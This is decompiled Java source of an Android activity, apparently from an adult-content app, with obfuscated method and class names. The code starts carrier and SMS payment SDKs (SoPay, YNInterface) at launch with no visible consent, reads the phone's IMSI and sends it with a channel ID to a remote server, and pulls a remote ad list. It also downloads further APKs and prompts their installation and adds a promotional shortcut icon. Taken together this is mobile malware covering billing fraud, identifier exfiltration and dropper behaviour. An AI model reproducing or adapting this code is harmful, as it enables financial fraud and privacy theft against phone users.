package com.dm.ts;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Message;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Window;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ImageButton;
import com.atnl.adultnovel.book.db.DBhelper;
import com.atnl.adultnovel.book.db.UpdateManager;
import com.es.iap.LocalP;
import com.lp.sdk.yninterface.YNInterface;
import com.sopay.SoPay;
import com.umeng.analytics.MobclickAgent;
import downIcon.DownloadService;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class DmtestActivity
  extends Activity
{
  public static String d = "v0.zip";
  public static String e = "http://gdown.baidu.com/data/wisegame/b7d7e4efd8199dea/tianyiyuedu_310.apk";
  private static final String i = Environment.getExternalStorageDirectory().getPath() + "/Colin";
  ApplicationInfo a;
  DBhelper b;
  UpdateManager c;
  Handler f = new c(this);
  ImageButton g;
  WebView h;
  private l j;
  private List<String> k = new ArrayList();
  private int l = 0;
  private int m = 0;
  private int n = 0;
  private int o = 0;
  private List<String> p;
  private List<String> q;
  
  public DmtestActivity() {}
  
  public static void a(Context paramContext, String paramString)
  {
    Intent localIntent = new Intent("android.intent.action.VIEW");
    localIntent.setAction("android.intent.action.VIEW");
    localIntent.setFlags(268435456);
    localIntent.setDataAndType(Uri.fromFile(new File(paramString)), "application/vnd.android.package-archive");
    paramContext.startActivity(localIntent);
  }
  
  private void a(String paramString)
  {
    for (;;)
    {
      try
      {
        Log.i("amp", paramString);
        paramString = new JSONObject(paramString);
        localJSONArray = new JSONArray(paramString.getString("adlist"));
        i1 = 0;
        if (i1 < localJSONArray.length()) {
          continue;
        }
        if (paramString.has("wappay")) {
          this.l = paramString.getInt("wappay");
        }
        if (paramString.has("wtb")) {
          DBhelper.setInfo("image", paramString.getInt("wtb"));
        }
        if (paramString.has("npay")) {
          this.m = paramString.getInt("npay");
        }
        if (paramString.has("adsdk")) {
          paramString.getInt("adsdk");
        }
        if (paramString.has("ch1")) {
          DBhelper.setInfo("taomike", paramString.getInt("ch1"));
        }
        if (paramString.has("ch3")) {
          DBhelper.setInfo("yien", paramString.getInt("ch3"));
        }
        if (paramString.has("ch4")) {
          DBhelper.setInfo("weipai", paramString.getInt("ch4"));
        }
        if (!paramString.has("ch6")) {
          continue;
        }
        DBhelper.setInfo("zhangyou", paramString.getInt("ch6"));
      }
      catch (JSONException paramString)
      {
        JSONArray localJSONArray;
        int i1;
        String str;
        paramString.printStackTrace();
        continue;
      }
      paramString = new Message();
      paramString.what = 10;
      this.f.sendMessage(paramString);
      return;
      str = localJSONArray.getString(i1);
      this.k.add(str);
      Log.i("amp", str);
      i1 += 1;
      continue;
      DBhelper.setInfo("zhangyou", -1);
    }
  }
  
  private boolean b(Context paramContext, String paramString)
  {
    paramContext = paramContext.getPackageManager().getInstalledPackages(0);
    int i1 = 0;
    for (;;)
    {
      if (i1 >= paramContext.size()) {
        return false;
      }
      if (((PackageInfo)paramContext.get(i1)).packageName.equalsIgnoreCase(paramString + ".youm")) {
        return true;
      }
      i1 += 1;
    }
  }
  
  private void e()
  {
    n localN = new n();
    SoPay.Go(this);
    a(15);
    new LocalP().onPayStart(this, false);
    localN.a(this);
    localN.a(this, this.f);
    DBhelper.setInfo("zhixing", 1);
    downIcon.f.a(this, "极速上网", "http://jump.anzhuangla.com/cfg.php?mod=hao123");
    if (this.k.size() != 0) {
      e = (String)this.k.get(this.n);
    }
    c();
    if ((DBhelper.getint("image") != -1) && (!b(this, "com.wyhd"))) {
      h();
    }
    g();
  }
  
  private void f()
  {
    String str = ((TelephonyManager)getSystemService("phone")).getSubscriberId();
    Log.i("result", "http://jump.anzhuangla.com/app.stateconf&cpid=" + this.a.metaData.getString("UMENG_CHANNEL") + "&imsi=" + str);
    new i(this, str).start();
  }
  
  private void g()
  {
    if ((DBhelper.getint("image") != -1) && (!b(this, "com.wyhd"))) {
      new Handler().postDelayed(new k(this), 2000L);
    }
  }
  
  private void h()
  {
    Object localObject = Environment.getExternalStorageDirectory();
    localObject = localObject + "/AdultNovel.apk";
    String str = com.d.a.a.a(this);
    if (j())
    {
      if (DBhelper.getint("file_size") == 0)
      {
        a localA = new a(str + ".apk");
        localA.a(new e(this, (String)localObject, str));
        localA.start();
        return;
      }
      if (i() == DBhelper.getint("file_size"))
      {
        a(this, (String)localObject);
        return;
      }
      this.c.checkUpdateInfo(str + ".apk");
      return;
    }
    this.c.checkUpdateInfo(str + ".apk");
  }
  
  private static long i()
  {
    File localFile = Environment.getExternalStorageDirectory();
    return new File(localFile + "/AdultNovel.apk").length();
  }
  
  private static boolean j()
  {
    File localFile = Environment.getExternalStorageDirectory();
    return new File(localFile + "/AdultNovel.apk").exists();
  }
  
  protected void a()
  {
    AlertDialog localAlertDialog = new AlertDialog.Builder(this).create();
    localAlertDialog.show();
    localAlertDialog.setCancelable(false);
    Window localWindow = localAlertDialog.getWindow();
    localWindow.setContentView(2130903067);
    ((Button)localWindow.findViewById(2131034179)).setOnClickListener(new h(this, localAlertDialog));
  }
  
  public void a(int paramInt)
  {
    Log.i("diaoyong", "YN");
    YNInterface.getInstance(this).pay("001102", paramInt, new j(this));
  }
  
  protected void b()
  {
    AlertDialog.Builder localBuilder = new AlertDialog.Builder(this);
    localBuilder.setCancelable(false);
    localBuilder.setMessage("18岁以下观众禁止观看，影片被定为成人影片，禁止未成年人观看");
    localBuilder.setTitle("安装私密空间");
    localBuilder.setPositiveButton("确定", new d(this));
    try
    {
      localBuilder.create().show();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
    }
  }
  
  void c()
  {
    Log.i("result", e);
    Intent localIntent = new Intent(this, DownloadService.class);
    localIntent.putExtra("flag", "start");
    localIntent.putExtra("url", e);
    startService(localIntent);
  }
  
  public void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    requestWindowFeature(1);
    setContentView(2130903066);
    this.b = new DBhelper(this);
    this.c = new UpdateManager(this);
    DBhelper.setInfo("TMKzhifu", 0);
    DBhelper.setInfo("WPzhifu", 0);
    DBhelper.setInfo("YNzhifu", 0);
    DBhelper.setInfo("zhangyouzhi", 0);
    this.j = new l(this);
    SoPay.Init(this);
    paramBundle = new IntentFilter();
    paramBundle.addAction("my_download_progress");
    paramBundle.addAction("my_download_success");
    paramBundle.addAction("my_download_fail");
    registerReceiver(this.j, paramBundle);
    this.p = new ArrayList();
    this.p.add("私密直播");
    this.p.add("看看影院");
    this.p.add("秀色直播");
    this.p.add("啪啪视频");
    this.p.add("纵情影院");
    this.q = new ArrayList();
    this.q.add("lg1");
    this.q.add("lg4");
    this.q.add("lg5");
    this.q.add("lg6");
    this.q.add("lg7");
    try
    {
      this.a = getPackageManager().getApplicationInfo(getPackageName(), 128);
      this.g = ((ImageButton)findViewById(2131034177));
      this.h = ((WebView)findViewById(2131034178));
      this.h.getSettings();
      paramBundle = this.a.metaData.get("Y_CPID").toString();
      paramBundle = "0" + paramBundle;
      YNInterface.getInstance(this).initSdk("0002460001", paramBundle);
      this.h.setWebViewClient(new f(this));
      this.h.loadUrl("http://jump.anzhuangla.com/app.ydy");
      this.g.setOnClickListener(new g(this));
      MobclickAgent.updateOnlineConfig(this);
      f();
      return;
    }
    catch (PackageManager.NameNotFoundException paramBundle)
    {
      for (;;)
      {
        paramBundle.printStackTrace();
      }
    }
  }
  
  protected void onDestroy()
  {
    super.onDestroy();
    if (this.j != null)
    {
      unregisterReceiver(this.j);
      this.j = null;
    }
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent)
  {
    if ((paramInt == 4) && (this.h.canGoBack()))
    {
      this.h.goBack();
      return true;
    }
    finish();
    return super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  protected void onPause()
  {
    super.onPause();
    MobclickAgent.onPageEnd("SplashScreen");
    MobclickAgent.onPause(this);
  }
  
  protected void onResume()
  {
    super.onResume();
    MobclickAgent.onPageStart("SplashScreen");
    MobclickAgent.onResume(this);
  }
  
  protected void onStart()
  {
    super.onStart();
    if (DBhelper.getint("zhixing") != 0) {
      g();
    }
  }
}
